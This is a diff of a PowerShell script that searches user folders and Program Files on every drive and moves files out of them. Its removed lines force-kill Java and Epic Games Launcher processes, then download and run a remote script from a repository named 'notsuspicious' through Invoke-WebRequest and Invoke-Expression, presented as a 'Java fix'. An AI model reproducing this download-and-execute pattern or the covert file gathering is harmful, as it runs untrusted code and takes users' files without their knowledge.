@@ -1,6 +1,3 @@
-# Attempt to stop processes if they are running
-Stop-Process -Name "java", "javaw", "EpicGamesLauncher" -Force -ErrorAction SilentlyContinue
-
 # Define source and destination paths
 $currentUser = $env:USERNAME
 $sourcePaths = @("C:\Users\$currentUser", "C:\Program Files")
@@ -40,15 +37,8 @@ foreach ($drive in $drives) {
         foreach ($path in $sourcePaths) {
             $searchPath = Join-Path -Path $driveLetter -ChildPath $path.Substring(3)
             if (Test-Path $searchPath) {
-                SearchAndMoveFiles -directory
-
-
-# Download and execute javafix.ps1 script
-try {
-    $javaFixScript = Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/javafix.ps1" -UseBasicParsing
-    Invoke-Expression $javaFixScript.Content
-    Write-Host "Java fix script executed successfully."
-}
-catch {
-    Write-Host "Failed to execute Java fix script: $_"
+                SearchAndMoveFiles -directory $searchPath
+            }
+        }
+    }
 }
